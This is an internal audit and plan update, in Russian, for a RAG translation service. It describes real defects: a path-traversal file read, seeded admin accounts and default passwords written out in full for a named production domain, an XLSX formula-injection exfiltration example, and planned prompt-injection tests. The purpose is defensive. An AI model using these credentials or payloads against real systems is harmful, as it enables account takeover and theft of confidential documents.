# Аудит и обновление плана улучшений DocRAGenslate

Дата фиксации: **15 июля 2026 года**
Тип документа: **аудит действующего production-контура и актуализация плана**
Предшественник: [`docs/improvement_plan_2026-07-11.md`](improvement_plan_2026-07-11.md)
(трекер 20 пунктов, § 3.3). Настоящий документ его не отменяет, а дополняет:
фиксирует новые дефекты, найденные при сплошной проверке кода, сверяет план с
фактическим состоянием репозитория и корректирует приоритеты по актуальным
внешним источникам на 15 июля 2026 года.

**Последнее обновление журнала исполнения:** 15 июля 2026 года, после коммита
`8b3e580`. Разделы 0–9 сохраняют исходный снимок аудита и его
рекомендации; фактический текущий статус, выполненные проверки и незакрытые
шлюзы приведены в § 10. По прямому решению владельца **§ 3
(P0-security контура доступа) исключен из этого цикла работ и не изменялся**.

## 0. Как проведен аудит

Проверка выполнена по полному дереву репозитория на коммите `5f6a3ad`
(локальная копия и сервер `a100` синхронизированы, `/healthz` возвращает `ok`).
Задействованы: сплошной обзор двенадцати подсистем (API и авторизация,
надежность REST, ядро RAG, чанкинг и память, парсинг, перевод и экспорт,
воркеры и очереди, база и разграничение доступа, веб-приложение, расширение,
тесты и контур сборки, конфигурация и инфраструктура); адверсариальная
перепроверка каждой существенной находки отдельным скептиком, которому дана
задача ее опровергнуть; отдельное исследование девяти технологических
направлений по первичным внешним источникам; двойная сверка плана с кодом и
документации между собой.

Итог по числам: подтверждено **пятнадцать серьезных дефектов** (две проблемы
уровня «критический», тринадцать — «высокий»), из них ни один не был опровергнут
на перепроверке. Дополнительно зафиксировано сорок пять проблем среднего уровня
и двадцать семь технического долга. Инженерный контур зеленый: `pytest` дает
799 пройденных и 1 пропущенный тест, `mypy` и `ESLint` без ошибок, обе
production-сборки проходят; десять замечаний `Ruff` относятся к служебному
скрипту `scripts/_e2e_full.py` и вне контура плана.

Корпус production на момент проверки: 12 документов, 1928 сегментов, 292
поисковых фрагмента. База — образ `pgvector/pgvector:0.8.5-pg17`, миграции
доведены до `0026`. Модельные сервисы `vLLM` работают на шести картах A100,
раскладка соответствует фактическим `deploy/*.service` (см. § 6).

## 1. Главный вывод

Функционально система готова и работает с реальными пользователями. Инженерное
качество кода высокое. Однако сплошная проверка обнаружила класс проблем,
которого нет в плане от 11 июля: **несколько дефектов безопасности контура
доступа и группу отказов надежности, при которых документ безвозвратно
«зависает» в промежуточном статусе**. Эти находки меняют приоритеты:
безопасность контура Keycloak и обхода чтения файлов должна быть закрыта раньше
любых модельных экспериментов, а устойчивость статусов документа — раньше
дальнейшего развития парсинга. Модельный стек, напротив, менять незачем: сверка
с мировыми источниками показала, что ни одной пермиссивно лицензированной модели
сильнее текущих на середину июля 2026 года не вышло; вложения дают отдачу в
детерминированной защите чисел и терминов, а не в замене весов.

## 2. Приоритеты после аудита

| Приоритет | Блок работ | Основание |
| --- | --- | --- |
| **P0-security** | Устранить обход чтения файлов через SPA-маршрут; убрать из репозитория и промышленного Keycloak сид-учетную запись администратора с фиксированным паролем; закрыть административную консоль Keycloak снаружи; отключить парольный grant у публичного клиента | § 3, новые находки |
| **P0-reliability** | Ввести восстановление документов, «зависших» в статусах `parsing`/`translating`/`exporting`; исправить бесшумную потерю перезапуска дополнительного перевода | § 4, новые находки |
| **P0-config** | Закрепить боевые флаги (точный бюджет контекста, визуальный контур, теневые контуры парсинга) в отслеживаемой конфигурации запуска — сейчас они существуют только в незакоммиченном окружении tmux-сессий | § 4, § 6 |
| **P1-quality** | Исправить ложные срабатывания проверки стандартов; исправить порчу гиперссылок при экспорте DOCX; начать детерминированную защиту чисел и единиц (пункт 14) — прямой рычаг слабейшей метрики | § 4, § 5 |
| **P1-model** | Обновить `vLLM` до версии не ниже 0.24 (закрывает удаленный отказ в обслуживании мультимодальной модели); повторно квалифицировать проверку цитат по селективной схеме; повторно квалифицировать лексический поиск с воспроизводимым протоколом | § 5 |
| **P1-security-infra** | Развернуть локальный стенд состязательной проверки RAG; настроить резервное копирование и проверку восстановления (пункт 3, ранее отложен) | § 5 |
| **P2** | Разделение очередей, перевод процессов под systemd, полная наблюдаемость, память переводов, фронтенд-долги | § 7 |
| **P3** | Обновление PostgreSQL 18, ревизия отклоненных контуров при росте корпуса, замена ARQ по триггеру | § 5, § 7 |

Сроки не назначаются: этапы принимаются по критериям качества и безопасности, а
не по факту реализации. Все работы ведутся по обязательному циклу
«WSL → локальная проверка → A100 → серверная проверка → production → smoke →
синхронизация» из плана 11 июля (§ 3.2). Production не используется как место
первичной разработки.

## 3. Новые находки уровня безопасности (P0)

Эти дефекты в плане 11 июля не описаны. Пункт 3 плана («секреты, лицензии,
Keycloak, резервное копирование») был отложен владельцем 13 июля; однако
перечисленные ниже проблемы конкретнее и опаснее общей гигиены секретов, поэтому
выносятся отдельно. Ни одно значение из production не изменялось; изменения
кода и конфигурации выполняются по общему циклу выпуска.

### 3.1. Обход чтения произвольных файлов через маршрут одностраничного приложения

**Файл:** `src/rag_app/api/main.py:129`. Уровень: **критический**.

Обработчик, отдающий одностраничное приложение, строит путь как
`candidate = WEB_DIST / full_path` и при `candidate.is_file()` возвращает
`FileResponse(candidate)` без проверки, что итоговый путь остается внутри каталога
`web/dist`. Маршрут регистрируется последним и публичен (файл `index.html` обязан
отдаваться до входа), поэтому запрос без токена с сегментами `..` в пути
(в том числе в процентном кодировании `%2e%2e`, которое обратные прокси не
схлопывают) выходит за пределы каталога. Перепроверка на установленном стеке
воспроизвела чтение `/etc/passwd` и произвольного файла вне `web/dist`. Процесс
API на сервере запущен от `root` из `/root/projects/rag_app`, поэтому вектор
дает чтение `.env` с секретами базы, MinIO и ключами подписи. Тестов, закрывающих
этот путь, нет.

Оговорка о среде: боевой контур находится за внутренним `Caddy` и внешним
терминатором TLS, которые могут нормализовать часть путей; тем не менее вектор в
процентном кодировании и доступность API внутри подсети делают проблему реальной,
а защита не должна опираться на прокси. Рекомендация: проверять, что
разрешенный путь лежит внутри `web/dist`
($\texttt{candidate.resolve()}$ должен иметь `web/dist` префиксом), либо целиком
перейти на штатный `StaticFiles`, где защита от обхода уже встроена. Приложить
регрессионный тест на `..` и на процентное кодирование.

### 3.2. Сид-администратор Keycloak с фиксированным паролем в репозитории

**Файл:** `deploy/keycloak/rag-app-realm.json:43-60`. Уровень: **критический**.

Файл экспорта realm, который импортируется в промышленный Keycloak (список
`redirectUris` уже содержит боевой домен `doc-rag-translate.ds-mind-lab.ru`),
создает двух пользователей — `ruslan` (роли `user`, `admin`) и `engineer` — с
непеременяемым паролем `rag-dev-2026`. Доступ в системе определяется как «владелец
плюс роль администратора», а администратор видит документы всех пользователей в
обход построчного разграничения. Пароль закоммичен в git, а чек-лист пусконаладки
`deploy/keycloak/PROD.md` не содержит шага удаления этих учетных записей. Более
того, `deploy/PUBLIC.md` прямо документирует вход `ruslan / rag-dev-2026` на
публичном домене. Любой, у кого есть репозиторий или кто знает документированный
пароль, входит администратором и читает конфиденциальную документацию
(нефтегаз, договоры) всех десяти пользователей.

Рекомендация: убрать сид-учетные записи из импортируемого файла realm (или
пометить пароль как временный с обязательной сменой); удалить `ruslan` и
`engineer` из промышленного Keycloak, ротировать секреты; добавить в
`PROD.md` явный шаг перехода на федерацию с каталогом организации. Убрать
документированный боевой пароль из `PUBLIC.md`.

### 3.3. Административная консоль Keycloak доступна снаружи, пароль по умолчанию

**Файл:** `deploy/proxy/Caddyfile:9`, `docker-compose.yml:67`. Уровень: **высокий**.

Внутренний `Caddy` проксирует пути `/admin*` и `/realms*` на Keycloak, то есть
административная консоль доступна через боевой домен. Пароль
bootstrap-администратора задан значением по умолчанию
`${RAG_KC_ADMIN_PASSWORD:-kc-admin-2026}`, а `PUBLIC.md` документирует рабочий
вход `admin / kc-admin-2026`. Прод-режим Keycloak (`start --optimized`, только
TLS) в реальности не применен: `Caddy` ходит на базовый порт `start-dev`.
Связка администратора realm `master` с паролем по умолчанию снаружи означает
полный захват единой аутентификации.

Рекомендация: не проксировать `/admin*` наружу (запрет или ответ 404 на уровне
`Caddy`, либо ограничение по внутренней подсети); убрать пароль по умолчанию из
`compose` (сделать обязательным); задать сильный пароль. Перейти на прод-режим
Keycloak согласно готовому scaffold.

### 3.4. Парольный grant на публичном клиенте без защиты от перебора

**Файл:** `deploy/keycloak/rag-app-realm.json:21`. Уровень: **высокий**.

У публичного клиента `rag-web` включен `directAccessGrantsEnabled: true` — это
прямой обмен логина и пароля на токен через конечную точку `/token` в обход
браузерного потока с PKCE. В realm отсутствуют защита от перебора
(`bruteForceProtected`) и парольная политика. В сочетании с известными сид-паролями
это дает скриптуемый перебор прямо против конечной точки токена без ограничения
попыток. Веб-приложению и расширению этот grant не нужен: оба используют
authorization code с PKCE.

Рекомендация: выставить `directAccessGrantsEnabled: false` для `rag-web`;
включить `bruteForceProtected: true` и парольную политику (длина, сложность,
блокировка).

## 4. Новые находки надежности и корректности (P0–P1)

### 4.1. Документ безвозвратно зависает в промежуточном статусе

**Файлы:** `src/rag_app/workers/tasks.py:110-128`, `606`, `833`;
`src/rag_app/api/routes/documents.py:62-85`. Уровень: **высокий**.

Захват задачи парсинга (`_claim_parse`) требует статус `uploaded`. Если воркер
перезапущен или убит посреди парсинга (штатный перезапуск через
`tmux kill-session`, нехватка памяти, сигнал завершения), статус уже `parsing`,
поэтому повтор задачи в ARQ возвращает «пропущено» как успех, и документ остается
в `parsing` навсегда. Отмена по тайм-ауту задачи (3600 секунд) приходит как
`CancelledError`, который не перехватывается `except Exception`, поэтому статус
ошибки тоже не записывается. Все пользовательские действия восстановления
(`/retry`, `/reparse`, `/reparse-ocr`, повторный экспорт) допускают только
статусы `error` и `done` и отвечают кодом 409 «документ в работе». Планировщика,
переводящего просроченные статусы в `error`, нет. Тот же класс отказа затрагивает
окна между фиксацией и постановкой следующей задачи (`parsed`, `translated`), а в
повторном экспорте статус меняется на `translated` до постановки задачи.

Значимость прямая: перезапуск воркера — штатная операция на сервере (согласно
рабочему регламенту процессы живут как основная команда tmux-сессии),
парсинг длится минуты, вероятность попасть в окно реальна. Единственный обход
сейчас — удалить документ и загрузить заново с потерей ручных правок.

Рекомендация: разрешить `_claim_parse` перезахват собственной ревизии
(статус `parsing` при совпадении `parse_revision`), либо ввести регламентную
задачу-сторож, переводящую документы, висящие в промежуточных статусах дольше
тайм-аута без активной задачи, в `error` с понятным текстом; перехватывать
`CancelledError` для записи статуса ошибки; ослабить гейт восстановления, допуская
повторную обработку из промежуточных статусов старше порога.

### 4.2. Перезапуск дополнительного перевода бесшумно теряется

**Файл:** `src/rag_app/api/routes/documents.py:475`. Уровень: **высокий**.

Создание перевода на дополнительный язык ставит задачу с фиксированным
идентификатором `translate_lang:{документ}:{язык}`, а основной воркер хранит
результат задачи час (`keep_result = 3600`). В ARQ постановка задачи бесшумно
возвращает `None` и не ставит новую задачу, пока существует ключ результата
предыдущего запуска — успешного или упавшего. При этом строка перевода уже
сброшена в статус «переводится», а возвращаемое значение постановки не
проверяется. Пользователь видит вечное «переводится», прошлый результат стерт;
пункт меню в интерфейсе при этом статусе заблокирован, поэтому перезапуск
недоступен не час, а до истечения хранения результата или вмешательства в базу.
Типичный триггер — немедленный повтор после ошибки перевода.

Рекомендация: добавить в идентификатор задачи случайный суффикс (как сделано для
экспорта и индексации) либо проверять результат постановки и при `None`
откатывать статус и возвращать понятный код.

### 4.3. Ложные срабатывания проверки стандартов заливают очередь ревью

**Файл:** `src/rag_app/pipeline/validate.py:64-68`. Уровень: **высокий**.

Регулярное выражение поиска стандартов не имеет границы слова слева и
скомпилировано без учета регистра, поэтому короткие префиксы (`EN`, `BS`, `UL`,
`ТУ`, `ОСТ`, `СТО`, `СП`) совпадают внутри обычных слов. Перепроверка
воспроизвела ложные срабатывания: «between 10 and 20» дает мнимый стандарт из-за
`en`, «when 3 pumps» — из-за `en`, «согласно пункту 5» — из-за `ту`, «место 3» —
из-за `сто`. Каждый такой сегмент получает лишний повторный вызов модели с
обратной связью (перевод дорожает вдвое), повторно не проходит проверку (в
переводе префикса нет) и навсегда помечается как требующий ревью. Конструкции
«between N» в англоязычных спецификациях и «пункту N» в русскоязычных договорах
встречаются почти в каждом документе, поэтому очередь ревью замусоривается и
доверие к признаку теряется. Проверка стандартов тестами не покрыта.

Рекомендация: добавить границу слова слева; для коротких латинских префиксов
убрать нечувствительность к регистру или требовать точный регистр; добавить
тесты на «between 10», «пункту 5», «место 3».

### 4.4. Экспорт DOCX дублирует текст в абзацах с гиперссылками

**Файл:** `src/rag_app/pipeline/ooxml.py:43-51`. Уровень: **высокий**.

В используемой версии `python-docx` текст абзаца включает текст гиперссылок, а
перечень прямых фрагментов — нет. Извлечение кладет в сегмент полный текст абзаца
вместе с текстом ссылки, а вставка перевода записывает результат в первый прямой
фрагмент и очищает остальные, не трогая фрагменты внутри гиперссылки. Перепроверка
запуском на коде проекта дала порчу: абзац «See spec at example.com/spec» после
вставки становится «перевод всего абзаца» плюс оставшийся оригинальный текст
ссылки; абзац из одной гиперссылки получает перевод рядом с оригиналом. В
договорах и технических заданиях ссылки и адреса в теле — обычное дело, поэтому
экспортированный «переведенный» документ получает видимую порчу. Гиперссылки
тестами не покрыты.

Рекомендация: при вставке очищать текст фрагментов внутри гиперссылок, либо при
извлечении брать только прямые фрагменты, чтобы извлечение и вставка были
симметричны.

### 4.5. Инструмент поиска рисунка игнорирует область чата из набора документов

**Файл:** `src/rag_app/rag/tools.py:226-229`. Уровень: **высокий → средний**
(после перепроверки).

В отличие от других инструментов агента, поиск рисунка фильтрует только по
одному документу и папке, но не по набору документов области чата. При выборе
двух и более документов интерфейс присылает именно набор идентификаторов, а
одиночный документ и папка пусты, поэтому поиск рисунка идет по всей библиотеке
владельца. Межпользовательской утечки нет: запрос дополнительно фильтруется по
владельцу, а построчное разграничение доступа удерживает изоляцию на протяжении
всего потока ответа. Поэтому уровень снижен до среднего: это нарушение области
чата (цитата и вырезка рисунка могут прийти из документа вне выбранного набора),
а не эскалация доступа.

Рекомендация: добавить ветку фильтрации по набору документов, симметрично прочим
инструментам.

### 4.6. Инъекция формул в экспортируемый XLSX

**Файл:** `src/rag_app/api/routes/extract.py:58-81`. Уровень: **высокий →
средний**.

Библиотека записи XLSX трактует строку, начинающуюся с `=`, как живую формулу.
Значения ячеек приходят из извлечения по фрагментам документов (модели
предписано переносить значения без изменений), а конечная точка принимает
произвольный JSON. Документ подрядчика с ячейкой вида
`=HYPERLINK("http://…"&A1)` превращается в живую формулу; при открытии в
табличном редакторе возможна эксфильтрация. Перепроверка подтвердила, что внутри
формата XLSX реальный вектор — только ведущий `=` (символы `+`, `-`, `@`
остаются текстом), а эксплуатация требует, чтобы получатель открыл файл и прошел
предупреждения. Поэтому уровень средний.

Рекомендация: экранировать строковые значения с ведущим `=` (и, для устойчивости
к переинтерпретации в CSV, `+`, `-`, `@`) на всех листах экспорта.

### 4.7. Незакрепленные боевые флаги в окружении tmux-сессий

**Файлы:** окружение процессов API и воркера на сервере против дефолтов в
`src/rag_app/config.py`. Уровень: **высокий** (эксплуатационный риск).

Четыре контура включены в production только через переменные окружения
tmux-сессий, а не через отслеживаемую конфигурацию:

- `RAG_RAG_CONTEXT_BUDGET_MODE=enforce` — принятый пунктом 12 точный бюджет
  контекста; дефолт в коде `off`;
- `RAG_VISUAL_ENABLED=true` — визуальный контур поиска; дефолт `False`;
- `RAG_PARSER_QUALITY_SHADOW_ENABLED=true` и
  `RAG_PARSER_PAGE_ROUTER_MODE=shadow` — теневые наблюдатели парсинга; дефолты
  `False`/`off`.

Любой перезапуск процесса вне tmux-сессии с этими переменными молча вернет
устаревшее поведение (например, приблизительный бюджет по числу символов вместо
точного токенизатора). Дополнительно обнаружен дрейф устройства: `.env` задает
MinerU на `cuda:2`, а фактический воркер работает с `cuda:4`.

Рекомендация: закрепить принятые флаги дефолтами в `config.py` (для `enforce`
бюджета и визуального контура — после периода наблюдения) или в декларативной
конфигурации запуска. Эта задача естественно решается вместе с переводом
процессов под systemd (пункт 17).

### 4.8. Прочие подтвержденные отказы восстановления и удаления

- **Осиротевшие объекты MinIO при удалении документа**
  (`src/rag_app/api/routes/documents.py:829`, уровень средний): при удалении
  чистятся только четыре ключа экспорта, а полноформатные рендеры оригинала и
  перевода и экспорты дополнительных переводов остаются в хранилище бессрочно.
  Межпользовательской утечки нет (строки базы удаляются каскадом), но семантика
  удаления и требования хранения нарушены. Рекомендация: удалять весь префикс
  документа в бакете экспортов и провести разовую зачистку накопленных сирот.
- **Повторный экспорт завешивает документ при сбое постановки задачи**
  (`src/rag_app/api/routes/segments.py:179`, средний): статус меняется до
  постановки задачи и не откатывается при сбое.
- **Кнопка «Повторить» в интерфейсе не обновляет список**
  (`web/src/routes/index.tsx:838`, средний): вызов без инвалидации кэша и
  обработки ошибки; статус визуально остается «ошибка» даже после успешной
  переобработки. Дублей задач сервер не создает (защита по статусу).
- **Транзиентная ошибка обновления токена стирает токен обновления в расширении**
  (`extension/utils/auth.ts:114-116`, средний): любой сетевой сбой ведет к
  разлогину; обновление токена не сериализовано. Рекомендация: стирать токены
  только при явном отказе сервера токенов, а сетевые ошибки не считать
  недействительностью.

## 5. Обновление плана по актуальным внешним источникам

Исследование девяти направлений по первичным источникам на 15 июля 2026 года.
Общий вывод: модельный стек оптимален для своих лицензионных ограничений и его
не следует менять; отдача — в детерминированной обработке и в закрытии одного
контурного дефекта безопасности.

### 5.1. Обновить vLLM — обязательно

Промышленная версия `vLLM 0.22.1` уязвима к двум удаленным отказам в
обслуживании. Один из них — падение движка через `prompt_embeds` для моделей с
многомерным вращательным кодированием — прямо касается мультимодальной
`Qwen3.5-35B-A3B`: любой авторизованный пользователь может уронить чат.
Уязвимость исправлена в версии 0.24.0. Актуальная стабильная версия — 0.25.0
(11 июля 2026, модель исполнения второго поколения по умолчанию, удален старый
механизм внимания, требует `transformers` пятой ветки). На картах A100 (Ampere)
ускорения внимания версий 0.24–0.25 неприменимы (это Hopper/Blackwell),
деприкации Ampere нет.

Действие (пункт 6.19 плана): обновить промышленный `vLLM` до версии не ниже 0.24
после матрицы совместимости с `Qwen3.5`, `Hy-MT2`, эмбеддером, реранкером и
парсерами. Переход на 0.25.0 — отдельным этапом после полного smoke. До
обновления убедиться, что вложение эмбеддингов промпта нигде не включено.
Контур парсинга при этом связан отдельным ограничением: `MinerU 3.4.4` требует
`vLLM` строго ниже 0.22, поэтому у парсинга собственное изолированное окружение
0.21.

### 5.2. Детерминированная защита чисел и единиц — главный рычаг качества

Слабейшая метрика системы — точность чисел и единиц $0{,}2297$ при доле
неподтвержденных чисел $0{,}3973$. Пункт 14 плана (детерминированная защита
сущностей) не начат, кода нет. Исследование подтвердило: числовые ответы —
систематическая зона отказа судейских метрик на основе языковых моделей, а
рабочая практика — детерминированный слой вне модели. Замена эмбеддера или
реранкера эту метрику не сдвинет (полнота поиска уже $0{,}959$).

Действие: реализовать детерминированный числовой контроль — извлечение всех
чисел и единиц из ответа регулярными выражениями, нормализация единиц (система
СИ и дюймовые для нефтегаза), сопоставление с фрагментами-источниками; несовпавшее
число ведет к перегенерации сегмента с указанием копировать числа дословно или к
пометке в интерфейсе. Тот же контур бесплатно дает онлайн-метрику доли
неподтвержденных чисел в наблюдаемость. Это же — контур защиты технических
сущностей из пункта 14 (плейсхолдеры чисел, диапазонов, единиц, стандартов и
формул до перевода, восстановление и проверка после).

### 5.3. Повторно квалифицировать проверку цитат по селективной схеме

Реализованный в пункте 12 строгий проверяющий контур отклонен: режим принуждения
дал $88{,}56\%$ безопасных отказов и обрушил долю отвечаемых вопросов. Мировая
практика 2025–2026 годов сошлась на **селективной проверке на уровне отдельных
утверждений** вместо отказа от всего ответа: ответ разбивается на атомарные
утверждения, каждое проверяется дешевым кодировщиком, удаляется или огрубляется
только неподтвержденное утверждение, полный отказ — лишь когда не выжило ни
одного. Такой подход показывает пригодность около $0{,}90$ против $0{,}61$ у
отказа от всего ответа. Под пермиссивными лицензиями доступны готовые
проверяющие модели: `LettuceDetect` (лицензия MIT, есть китайская модель) и
`HHEM-2.1-Open` (Apache 2.0, работает на процессоре). Для русского готовой модели
нет — это реальный пробел, закрываемый дообучением по опубликованному рецепту
(перевод размеченного набора собственной моделью Hy-MT2 и дообучение кодировщика).

Действие (пункт 12, повтор): заменить отклоненный строгий контур на селективную
проверку с калибровкой порога по кривой «риск — покрытие» на 236 эталонных кейсах;
целевой режим — точность цитат не ниже $0{,}90$ при отвечаемости не ниже $0{,}85$;
жесткую гарантию на весь ответ не ставить (дает более $80\%$ отказов). Слабый
китайский (отвечаемость $0{,}8148$) закрывается той же китайской моделью
проверки.

### 5.4. Повторно квалифицировать лексический поиск — методология, а не движок

Квалификация BM25 (пункт 9) сорвалась не из-за проигрыша качества, а из-за того,
что боевой реранкер не давал воспроизводимых оценок между повторами. Исследование
объясняет причину: `vLLM` по умолчанию не гарантирует воспроизводимость, оценки
зависят от состава батча (ядра не инвариантны к размеру батча) — это
документированное и ожидаемое поведение. Критерий «оценки совпали побитово» был
методологически неверным.

Действие: перед любым повтором квалификации поднять временный инстанс реранкера
с размером батча один и строго последовательной подачей пар в фиксированном
порядке, в точности `float32` или хотя бы `float16` вместо `bfloat16`; сравнивать
не сырые оценки, а итоговое ранжирование (порядок, полноту, нормированную оценку)
с допуском. Дополнительно проверить, что шаблон реранкера действительно
применяется (известная ошибка `vLLM`, при которой шаблон молча игнорируется, — это
систематическое смещение оценок, более грубое, чем недетерминизм). Единственный
лицензионно допустимый движок BM25 для PostgreSQL — `pg_textsearch` (лицензия
PostgreSQL, русский из коробки); альтернативы `VectorChord-BM25` и
`ParadeDB pg_search` под AGPL исключены навсегда правилом лицензий. Отдельно для
слабого китайского: сегментировать китайский на стороне приложения библиотекой
`jieba` (MIT) в отдельный полнотекстовый вектор и включить в существующее
объединение рангов — точечно чинит лексическую ветку, где сейчас весь китайский
текст виден как один токен.

### 5.5. Что менять не следует — подтверждено

- **Текстовый эмбеддер и реранкер.** Единственная модель выше
  `Qwen3-Embedding-8B` на мультиязычном рейтинге не проходит по лицензии (запрет
  на ЕС и условия Gemma); `Qwen3-Reranker-4B` остается сильнейшим пермиссивным
  мультиязычным реранкером — все новые сильные конкуренты некоммерческие.
  Единственный дешевый эксперимент внутри текущей модели — сравнение урезанной
  размерности $1024$ против полной $4096$ на 236 кейсах (требует только
  переиндексации; «налог» на урезание размерности реален).
- **Парсеры.** `MinerU 3.4.4` — последняя стабильная версия, именно она закрывает
  регрессии текстового слоя версий 3.4.0–3.4.3; предрелизы 4.0 в production не
  брать. `PaddleOCR-VL 1.6` и `dots.mocr` актуальны. Единственная новинка,
  проходящая по лицензии и заявляющая уровень выше стека, — `Infinity-Parser2`
  (Apache 2.0); его стоит внести в очередь A/B на закрытом наборе, но не как
  срочную замену. **Важно для пункта 3:** `MinerU` с версии 3.1.0 сменил лицензию
  с AGPLv3 на собственную на базе Apache 2.0 с порогами (для нас нерелевантными)
  и требованием упоминания при предоставлении онлайн-сервиса — это нужно отразить
  в реестре лицензий и, при трактовке продукта как сервиса третьим лицам, добавить
  упоминание в интерфейс.
- **Машинный перевод.** Пермиссивных моделей сильнее `Hy-MT2-7B` не вышло.
  `Hy-MT2-30B-A3B` существует, но готовой квантизации под одну карту A100-40 нет
  (только FP8, рискованный на Ampere по нашему же опыту), а выигрыш над 7B
  ограничен. **Важно:** лицензия семейства `Hy-MT2` сменена на Apache 2.0, но в
  части файлов репозитория остался старый текст — нужно проверить лицензию
  фактически развернутого снимка модели и зафиксировать хеш и лицензию.
- **Разграничение доступа.** Текущая изоляция (построчное разграничение в
  fail-closed режиме плюс фильтры области, API под ролью без обхода разграничения)
  соответствует лучшей практике мультитенантного RAG 2026 года — радикально
  менять нечего.
- **Фронтенд.** Стек актуален, ни одна из громких волн уязвимостей 2026 года не
  применима (уязвимости `Vite` касаются только dev-сервера; критическая
  уязвимость React живет в пакетах серверных компонентов, которых в проекте нет;
  в `pdf.js` версии 6 известных уязвимостей нет). Достаточно ежемесячного аудита
  зависимостей.

### 5.6. Развернуть стенд состязательной проверки и резервное копирование

Локальный стенд состязательной проверки RAG (пункт 20, § 11 плана) не развернут.
`Promptfoo` (лицензия MIT, работает локально без внешней передачи) — рабочий выбор:
есть сценарий косвенной инъекции через извлеченный контекст и пресеты OWASP.
Обязательный состав проверок: косвенная инъекция из содержимого документа и из
имен файлов; межобластная утечка (документ одного пользователя в ответе другому);
определение наличия документа в базе по выводам; отравление базы; извлечение
системного промпта; навязывание ложных чисел; инъекции на китайском. Для детекции
на входе и выходе допустим `Qwen3Guard` (Apache 2.0, покрывает китайский) плюс
выделенный классификатор инъекций `PIGuard` (после проверки его лицензии);
`Llama Prompt Guard` не брать — лицензия непермиссивна. Сборку промпта агента
проверить: извлеченные фрагменты должны идти строго в пользовательскую роль, а не
в системную, с явными разделителями и пометкой источника.

Резервное копирование (пункт 3, ранее отложено): внедрить `pgBackRest` (лицензия
MIT, проект активен) — полные и разностные копии базы и архив журнала
предзаписи в репозиторий на отдельном носителе; для MinIO включить версионирование
и зеркалирование на второй приемник; для Keycloak — регламентный экспорт realm.
Критерий приемки пункта — документально подтвержденное восстановление приложения
и одного документа на отдельном контуре в пределах целевых показателей.

## 6. Расхождения документации с фактическим состоянием

Сверка выявила устаревшие утверждения. На корректность кода они не влияют, но
вводят в заблуждение при навигации. Главное расхождение — статус визуального
контура.

| Где | Утверждение | Факт | Действие |
| --- | --- | --- | --- |
| `CLAUDE.md`/`AGENTS.md`, блок статуса | «Визуальный эмбеддер запаркован на GPU5, GPU2 свободна/отдана Alma» | Контур ревайвнут 19 июня, активен на GPU2 (`vllm-visual-embedding.service` порт 8007, `vllm-visual-reranker.service` порт 8009), в production включен через окружение | Переписать блок раскладки; упомянуть визуальный реранкер (сейчас отсутствует) |
| `src/rag_app/config.py:87-93` | «Визуальный контур запаркован, сервис погашен» | Описывает состояние до ревайва | Обновить комментарий |
| `CLAUDE.md` | «PaddleOCR-VL 1.6 — on-demand» | Постоянный сервис на GPU0 порт 8118 (`paddle-genai.service`) | Заменить формулировку |
| `config.py:284`, план § 2 | «MinerU 3.3 / 3.3.1» | В production `MinerU 3.4.4` (переключен 14 июля), пин `pyproject.toml` | Поправить комментарий; в § 2 плана добавить пометку о снимке на 11 июля |
| `config.py:37` | «Воркхорс перевода — Qwen3.5» | Весь перевод на `Hy-MT2-7B`; `Qwen3.5` — только чат и анализ | Убрать слово «перевод» |
| `config.py:111,118,196,261,291` | Стейл-комментарии: генеративный VL на GPU2 порт 8008; контекст 8192; dots/paddle на GPU4 | VL — мультимодальный `Qwen3.5` порт 8006; контекст 16384; dots и paddle на GPU0 | Обновить комментарии |
| `CLAUDE.md`, ссылка на § 4.3 roadmap как на актуальную раскладку | Раскладка `GPU0–1 Qwen3-32B…` | Исторический план версии 1.0; фактическая раскладка — журнал и `deploy/*.service` | Переформулировать ссылку; в roadmap пометить § 4.3 как исторический |
| `account_isolation_smoke_2026-07-13.md` | «8 аккаунтов требуют интерактивного шага» | Устранено 14 июля, полный smoke проходит 10/10 | Добавить абзац-обновление |

Фактическая раскладка карт (из `deploy/*.service`), которую следует
зафиксировать как эталонную: GPU0 — `dots.mocr` (8120) и `PaddleOCR-VL` (8118);
GPU1 — `Hy-MT2-7B` (8005); GPU2 — визуальный эмбеддер (8007) и визуальный
реранкер (8009), совместно с приложением Alma; GPU3 — `Qwen3.5-35B-A3B` (8006);
GPU4 — `Qwen3-Embedding-8B` (8002) и `Qwen3-Reranker-4B` (8003); GPU5 —
`MinerU2.5-Pro` (30010).

Проверено без расхождений: подписи в `rag_release_gate.md` совпадают с
`release-policy-v1.json`; таблица моделей плана совпадает с портами и картами
юнитов; дефолты флагов поиска в `config.py` соответствуют решениям NO-GO пунктов
9–12; `CLAUDE.md` и `AGENTS.md` побайтово идентичны.

## 7. Состояние 20 пунктов плана после сверки с кодом

Статусы из трекера 11 июля подтверждены по коду. Ниже — уточнения по незакрытым
и построенным-но-выключенным контурам **на момент исходного аудита**. Этот снимок
оставлен для воспроизводимости; актуальное состояние исполнения после коммитов
`994f4ca` и `5ec33ea` приведено в § 10.

| № | Пункт | Статус | Уточнение по коду |
| -: | --- | --- | --- |
| 1 | Зеленые проверки и CI | завершен | 799 тестов, но интеграционный тест разграничения на реальной базе бесшумно пропускается в CI (нет переменной окружения) — покрытие главного механизма изоляции фактически отсутствует; поднять базу в CI |
| 2 | Fail-closed разграничение | завершен | Миграция `0025`, FORCE на 16 таблицах; в production доказано |
| 3 | Секреты, лицензии, Keycloak, копии | отложен | **Пересмотреть в свете § 3:** обход чтения файлов, сид-администратор и открытая консоль — конкретнее и опаснее общей гигиены. Плюс дефолтные пароли в `compose` и `config.py`, секреты Langfuse в закоммиченном `compose`. Копий по-прежнему нет |
| 4 | Эталонный набор | завершен | Базовые метрики зафиксированы; структурной разметки (родитель/порядок/связь) нет — это блокер повторной оценки парсинга |
| 5 | Выпускной шлюз моделей | завершен | Список одобренных весов пуст намеренно; кандидат не принят |
| 6 | A/B MinerU 3.4 | завершен | Остается долг: эталонная метрика порядка блоков внутри страницы |
| 7 | MinerU-Popo и дерево документа | завершен (NO-GO) | Модуль дерева подключен только к тестам; в пайплайне не вызывается даже теневым режимом |
| 8 | Оценка парсинга и fallback | завершен (NO-GO) | Постраничный резерв выключен: у резервного парсера нет точных рамок для цитат |
| 9 | Настоящий BM25 | завершен (NO-GO) | **Пересмотреть по § 5.4:** причина срыва — недетерминизм оценок, а не проигрыш; повтор с воспроизводимым протоколом оправдан |
| 10 | Фильтрованный HNSW | завершен (NO-GO) | При 292 фрагментах точный поиск верен с запасом; ревизия при росте до десятков тысяч фрагментов |
